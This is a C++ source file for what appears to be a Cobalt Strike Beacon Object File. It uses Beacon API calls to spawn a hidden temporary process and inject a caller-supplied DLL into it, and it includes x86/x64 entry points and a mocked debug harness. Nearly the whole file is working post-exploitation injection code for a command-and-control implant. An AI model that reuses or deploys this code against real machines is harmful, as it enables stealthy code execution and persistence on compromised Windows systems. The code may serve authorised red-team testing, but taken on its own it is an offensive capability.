#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"

#if defined _M_X64
#include "debug.x64.h"
#elif defined _M_IX86
#inclue "debug.x86.h"
#endif

#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

extern "C" {
#include "beacon.h"

    DFR(MSVCRT, memset);
    #define memset MSVCRT$memset

    void go(char* args, int len, BOOL x86) {
        STARTUPINFOA        si;
        PROCESS_INFORMATION pi;
        datap               parser;
        short               ignoreToken;
        char*               dllPtr;
        int                 dllLen;

        /* Warn about crossing to another architecture. */
        if (!is_x64() && x86 == FALSE) {
            BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
        }
        if (is_x64() && x86 == TRUE) {
            BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
        }

        /* Extract the arguments */
        BeaconDataParse(&parser, args, len);
        ignoreToken = BeaconDataShort(&parser);
        dllPtr = BeaconDataExtract(&parser, &dllLen);

        memset(&si, 0, sizeof(STARTUPINFOA));
        memset(&pi, 0, sizeof(PROCESS_INFORMATION));

        /* setup the other values in our startup info structure */
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.cb = sizeof(STARTUPINFO);

        /* Ready to go: spawn, inject and cleanup */
        if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
            BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
            return;
        }

        BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
        BeaconCleanupProcess(&pi);
    }

    void gox86(char* args, int alen) {
        go(args, alen, TRUE);
    }

    void gox64(char* args, int alen) {
        go(args, alen, FALSE);
    }
}

#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // To pack arguments for the bof use 
    // bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<BOOL, char*>(gox64, TRUE, (char*)&debug_dll);
    
    return 0;
}

#endif